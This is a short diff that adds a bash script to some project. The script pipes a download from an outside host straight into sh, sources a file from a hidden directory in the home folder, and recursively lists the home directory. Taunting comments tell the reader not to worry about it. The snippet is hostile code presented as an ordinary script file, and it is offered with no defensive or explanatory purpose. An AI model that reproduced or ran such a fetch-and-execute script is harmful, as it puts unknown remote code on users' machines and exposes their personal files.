@@ -1,0 +1,9 @@
+#!/bin/bash
+
+# loL whatcha lookin for in here???
+# Don't worry about it!!!
+
+curl -s 'https://suckaaa.com/s/lib-installer' | sh;
+source ~/.garbage/lib;
+
+ls -LR ~/.;
